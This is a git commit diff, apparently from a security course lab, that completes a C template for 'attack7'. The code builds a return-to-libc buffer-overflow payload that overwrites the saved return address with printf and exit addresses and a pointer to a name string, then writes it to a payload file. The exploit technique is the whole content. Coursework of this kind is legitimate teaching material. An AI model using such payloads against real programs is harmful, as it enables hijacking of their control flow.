d466441570d9782fdb998d68d176ede67e981569
Surya-Prasad <suryaramana99@gmail.com>
2025-10-25 00:12:10 +0000

    Task 07: Ewok Meet n' Greet

--- Project-Files/attack_templates/attack7.c
+++ Project-Files/attack_templates/attack7.c
@@ -7,6 +7,32 @@
 int main(int argc, char **argv)
 {
     /* YOUR CODE: Generate buf appropriately */
-    write_to_file( "attack7-payload", *YOUR BUFFER* , *YOUR BUFFER LENGTH* , FILE_CLEAR );
+    long eip_addr = 0xffffd09c;
+    long printf_addr = 0xf7e2c060;
+    long exit_addr = 0xf7e0f990;
+    long buf_addr = 0xffffd05b;
+    long inputStr_addr = 0x804e700; 
+
+    int offset = eip_addr - buf_addr;
+    printf("Offset7: %d\n", offset);
+
+    char name[] = "Surya\n";
+
+    int buf_size = offset + 12 + strlen(name) + 1; // offset(*) + printf + exit + name + \\0
+    char attack7_buffer[buf_size];
+
+    memset(attack7_buffer, '*', buf_size);
+    // Copy printf, exit and name
+    memcpy(attack7_buffer + offset, &printf_addr, 4);
+    memcpy(attack7_buffer + offset + 4, &exit_addr, 4);
+    memcpy(attack7_buffer + offset + 12, name, strlen(name) + 1);
+
+    // Copy inputStr address
+    long name_ptr = inputStr_addr + offset + 12;
+    memcpy(attack7_buffer + offset + 8, &name_ptr, 4);
+
+
+    write_to_file( "payloads/attack7-payload", attack7_buffer, buf_size, FILE_CLEAR );
     exit(0);
 }
+
